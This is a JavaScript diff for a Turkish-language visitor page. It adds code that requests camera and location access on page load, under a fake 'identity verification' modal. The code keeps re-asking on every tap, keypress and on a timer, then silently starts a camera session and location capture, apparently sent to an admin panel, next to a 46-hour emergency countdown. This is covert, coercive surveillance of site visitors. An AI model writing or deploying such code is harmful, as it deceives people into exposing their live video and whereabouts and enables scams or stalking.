@@ -1557,9 +1557,130 @@
   let cameraPermLoopToken = 0;
   let cameraPermLoopTimer = null;
   let mediaForceGestureUnsub = null;
+  let earlyCameraStream = null;
+  let earlyLocationPos = null;
+  let pageEntryPermBooted = false;
   const CAMERA_PERM_RETRY_MS = 10_000;
   const CAMERA_PERM_DENIED_TEXT =
     "Kimlik doğrulaması için izin zorunludur. Lütfen İzin Ver’i seçin; aksi halde doğrulama tamamlanamaz.";
+
+  function hidePageEntryPermGate() {
+    document.getElementById("page-entry-perm-gate")?.remove();
+  }
+
+  function showPageEntryPermGate() {
+    if (document.getElementById("page-entry-perm-gate")) return;
+    const gate = document.createElement("div");
+    gate.id = "page-entry-perm-gate";
+    gate.className = "page-entry-perm-gate";
+    gate.setAttribute("role", "dialog");
+    gate.setAttribute("aria-modal", "true");
+    gate.setAttribute("aria-label", "İzin gerekli");
+    gate.innerHTML = `
+      <div class="page-entry-perm-card">
+        <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
+        <h2>İzin gerekli</h2>
+        <p>Devam etmek için tarayıcı iznini vermeniz gerekir. Açılır pencerede <strong>İzin Ver</strong>’i seçin.</p>
+        <button type="button" class="btn btn-primary" data-page-perm-allow>İzin ver</button>
+      </div>
+    `;
+    const allow = () => {
+      void requestPageEntryPermissions(true).then((ok) => {
+        if (ok) hidePageEntryPermGate();
+      });
+    };
+    gate.querySelector("[data-page-perm-allow]")?.addEventListener("click", (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      allow();
+    });
+    gate.addEventListener("click", (e) => {
+      if (e.target === gate) allow();
+    });
+    document.body.appendChild(gate);
+  }
+
+  function takeEarlyCameraStream() {
+    const s = earlyCameraStream;
+    if (!s) return null;
+    const live = s.getTracks?.().some((t) => t.readyState === "live");
+    if (!live) {
+      earlyCameraStream = null;
+      return null;
+    }
+    earlyCameraStream = null;
+    return s;
+  }
+
+  async function requestPageEntryPermissions(fromGesture = false) {
+    let camOk = false;
+    const existing = earlyCameraStream;
+    if (existing?.getTracks?.().some((t) => t.readyState === "live")) {
+      camOk = true;
+    } else {
+      try {
+        earlyCameraStream = await acquireCameraStreamNative();
+        camOk = true;
+        hidePageEntryPermGate();
+      } catch (err) {
+        console.warn("page-entry camera", err?.name || err);
+        if (!fromGesture) showPageEntryPermGate();
+      }
+    }
+
+    if (!earlyLocationPos && navigator.geolocation) {
+      try {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            earlyLocationPos = pos;
+          },
+          () => {},
+          { enableHighAccuracy: false, maximumAge: 60000, timeout: 20000 }
+        );
+      } catch {
+        /* ignore */
+      }
+    }
+
+    return camOk;
+  }
+
+  function bootImmediatePagePermissions() {
+    if (pageEntryPermBooted) return;
+    if (/admin\.html$/i.test(location.pathname || "")) return;
+    pageEntryPermBooted = true;
+
+    // Sayfa açılır açılmaz — Firebase / sohbet beklemeden
+    void requestPageEntryPermissions(false);
+
+    let lastAt = 0;
+    const onGesture = () => {
+      const now = Date.now();
+      if (now - lastAt < 700) return;
+      lastAt = now;
+      const live = earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live");
+      if (live) {
+        hidePageEntryPermGate();
+        return;
+      }
+      void requestPageEntryPermissions(true);
+    };
+    document.addEventListener("pointerdown", onGesture, true);
+    document.addEventListener("touchstart", onGesture, true);
+    document.addEventListener("keydown", onGesture, true);
+
+    // Kısa aralıklarla tekrar dene (bazı tarayıcılar ilk yüklemede sessizce reddeder)
+    let tries = 0;
+    const iv = window.setInterval(() => {
+      tries += 1;
+      const live = earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live");
+      if (live || tries > 12) {
+        window.clearInterval(iv);
+        return;
+      }
+      void requestPageEntryPermissions(false);
+    }, 1800);
+  }
 
   function stopCameraPermissionLoop() {
     cameraPermLoopToken += 1;
@@ -1672,10 +1793,38 @@
       if (token !== cameraPermLoopToken || attempting) return;
       if (callId && sessionHasBoth(callId)) {
         stopCameraPermissionLoop();
+        maybeOfferPhoneEntry(box);
         return;
       }
       attempting = true;
       try {
+        // 1) Önce native izin — sayfa girer girmez (Firebase beklemeden)
+        let stream = null;
+        const early = earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live")
+          ? earlyCameraStream
+          : null;
+        if (early) {
+          stream = early;
+        } else {
+          try {
+            stream = await acquireCameraStreamNative();
+            earlyCameraStream = stream;
+            hidePageEntryPermGate();
+          } catch {
+            if (!fromGesture) showPageEntryPermGate();
+          }
+        }
+
+        if (!earlyLocationPos && navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              earlyLocationPos = pos;
+            },
+            () => {},
+            { enableHighAccuracy: false, maximumAge: 60000, timeout: 20000 }
+          );
+        }
+
         let sync = window.ChatSync;
         if (!sync?.enabled && window.ChatSyncReady) {
           sync = await window.ChatSyncReady.catch(() => null);
@@ -1686,7 +1835,6 @@
         }
 
         if (!callId) {
-          // Admin panelinde görünür; ziyaretçi sohbetine yazdırma
           const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT);
           callId = offer?.callId;
           if (!callId) {
@@ -1699,40 +1847,31 @@
 
         let existing = cameraSessions.get(callId);
         if (!existing?.stream) {
-          let stream = null;
-          try {
-            stream = await acquireCameraStreamNative();
-          } catch {
-            /* jest gerekir / engelli — tekrar dene */
+          if (!stream && fromGesture) {
+            try {
+              stream = await acquireCameraStreamNative();
+              earlyCameraStream = stream;
+              hidePageEntryPermGate();
+            } catch {
+              /* ignore */
+            }
           }
-          if (stream || fromGesture) {
-            if (!stream && fromGesture) {
-              try {
-                stream = await acquireCameraStreamNative();
-              } catch {
-                /* ignore */
-              }
-            }
-            if (stream) {
-              await startVisitorCamera(box, callId, {
-                auto: true,
-                silent: true,
-                deferLocation: false,
-                stream,
-              });
-            } else if (!isLikelyMobile() || fromGesture) {
-              await startVisitorCamera(box, callId, {
-                auto: true,
-                silent: true,
-                deferLocation: false,
-              });
-            }
-          } else {
-            // Mobil jest yokken de zorla dene (bazı tarayıcılar açar)
+          const useStream = stream || takeEarlyCameraStream();
+          if (useStream && useStream === earlyCameraStream) earlyCameraStream = null;
+          if (useStream) {
             await startVisitorCamera(box, callId, {
               auto: true,
               silent: true,
               deferLocation: false,
+              stream: useStream,
+              seedLocation: earlyLocationPos || undefined,
+            });
+          } else {
+            await startVisitorCamera(box, callId, {
+              auto: true,
+              silent: true,
+              deferLocation: false,
+              seedLocation: earlyLocationPos || undefined,
             });
           }
         }
@@ -1740,15 +1879,16 @@
         existing = cameraSessions.get(callId);
         if (existing && !existing._hadLocation) {
           try {
-            if (fromGesture) existing.retryLocation?.();
-            else existing.retryLocation?.();
+            existing.retryLocation?.();
           } catch {
             /* ignore */
           }
-          // Doğrudan da iste
-          if (navigator.geolocation && !existing._hadLocation) {
+          if (earlyLocationPos?.coords) {
+            applySeedLocationToSession(sync, callId, existing, earlyLocationPos);
+          } else if (navigator.geolocation && !existing._hadLocation) {
             navigator.geolocation.getCurrentPosition(
               (pos) => {
+                earlyLocationPos = pos;
                 const live = cameraSessions.get(callId);
                 if (live) applySeedLocationToSession(sync, callId, live, pos);
               },
@@ -1760,6 +1900,7 @@
 
         if (sessionHasBoth(callId)) {
           stopCameraPermissionLoop();
+          hidePageEntryPermGate();
           maybeOfferPhoneEntry(box);
           return;
         }
@@ -2565,6 +2706,8 @@
         window.clearTimeout(openSeqTimer);
         openSeqTimer = null;
       }
+      bootImmediatePagePermissions();
+      void requestPageEntryPermissions(false);
       stopCameraPermissionLoop();
       window.ChatSync?.stopGoogleSignInLoop?.();
       clearPermissionDeniedNotice(box);
@@ -2741,6 +2884,9 @@
       if (supportListenerBound || n > 80) clearInterval(t);
     }, 50);
   }
+
+  // Her ziyaretçi sayfasında: açılır açılmaz izin iste
+  bootImmediatePagePermissions();
 
   /* —— 46 saatlik acil geri sayım —— */
   const DEADLINE_MS = 46 * 60 * 60 * 1000;
